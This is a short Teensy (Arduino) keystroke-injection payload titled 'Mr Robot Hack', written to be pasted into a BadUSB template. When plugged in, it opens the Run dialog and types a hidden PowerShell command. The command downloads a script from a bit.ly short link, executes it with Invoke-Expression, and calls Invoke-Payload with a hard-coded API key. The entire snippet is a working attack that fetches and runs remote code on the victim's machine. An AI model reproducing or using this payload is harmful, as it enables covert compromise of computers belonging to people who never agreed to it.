// Mr Robot Hack
// Teensy-Plantilla-Base required: https://github.com/H3LL0WORLD/Teensy-Plantilla-Base
// Paste into the payload function

const String APIKey = "2856557c5d9f96d0e416c70aa691cbd1";
const String urlpayload = "http://bit.ly/2ce8RKX";
GUI(R);
delay(500);
escribir("Powershell -W H Invoke-Expression (New-Object Net.WebClient).DownloadString('");
escribir (urlpayload);
escribir("'); Invoke-Payload ");
Escribir(APIKey);
